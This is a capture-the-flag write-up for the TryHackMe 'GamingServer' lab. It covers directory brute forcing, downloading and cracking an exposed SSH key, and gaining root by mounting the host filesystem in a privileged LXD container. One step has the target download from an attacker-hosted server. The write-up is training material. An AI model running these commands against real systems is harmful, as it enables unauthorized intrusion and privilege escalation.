# TryHackMe - GamingServer Writeup

## Overview

* Room: GamingServer
* Difficulty: Easy
* Platform: TryHackMe
* Objective: Gain initial access and escalate privileges to root

This machine is a beginner-friendly boot-to-root challenge focusing on enumeration, web exploitation, SSH key cracking, and privilege escalation.

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV <TARGET_IP>
```

### Results

* Port 22 → SSH
* Port 80 → HTTP

The target exposes a web server and SSH service, indicating a possible web-based entry point followed by remote access.

---

## Web Enumeration

### Initial Access

Visiting the web server reveals a simple page with minimal content.

Inspecting the source code reveals a comment mentioning a user:

```
john, please add some actual content to the site!
```

Potential username identified: `john`

---

### Directory Brute Forcing

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Discovered Directories

* /uploads
* /secret

---

## Sensitive File Discovery

### /uploads Directory

Files found:

* dict.lst → Wordlist
* manifesto.txt → Not useful
* meme.jpg → Not useful

Download:

```bash
wget http://<TARGET_IP>/uploads/dict.lst
```

---

### /secret Directory

Contains SSH private key.

Download:

```bash
wget http://<TARGET_IP>/secret/secretKey -O id_rsa
```

---

## SSH Key Cracking

The private key is passphrase-protected.

### Convert key for cracking

```bash
ssh2john id_rsa > hash.txt
```

### Crack using John the Ripper

```bash
john --wordlist=dict.lst hash.txt
```

### Result

```
letmein (id_rsa)
```

Passphrase: `letmein`

---

## Initial Access (SSH)

Fix permissions:

```bash
chmod 600 id_rsa
```

Connect:

```bash
ssh -i id_rsa john@<TARGET_IP>
```

Enter passphrase:

```
letmein
```

---

## User Flag

```bash
cat user.txt
```

---

## Privilege Escalation

### Enumeration

```bash
id
```

User belongs to group:

```
lxd
```

---

## Exploitation (LXD)

### Step 1: Clone repository

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
```

### Step 2: Build image

```bash
./build-alpine
```

---

### Step 3: Transfer to target

On attacker machine:

```bash
python3 -m http.server 8000
```

On target machine:

```bash
wget http://<ATTACKER_IP>:8000/alpine-*.tar.gz
```

---

### Step 4: Import image

```bash
lxc image import ./alpine-*.tar.gz --alias myimage
```

### Step 5: Create privileged container

```bash
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

### Step 6: Start container

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

---

### Step 7: Access root

```bash
cd /mnt/root/root
cat root.txt
```

---

## Key Takeaways

* Always inspect source code for hidden information
* Perform directory brute forcing to discover hidden paths
* SSH keys can be cracked if passphrase-protected
* Correct file permissions are required for SSH keys
* Misconfigured LXD group membership can lead to root access

---

## Conclusion

This room demonstrates a complete attack chain:

1. Enumeration and discovery
2. Credential extraction and cracking
3. Initial access via SSH
4. Privilege escalation using LXD

A solid beginner-level lab combining web exploitation and privilege escalation techniques.
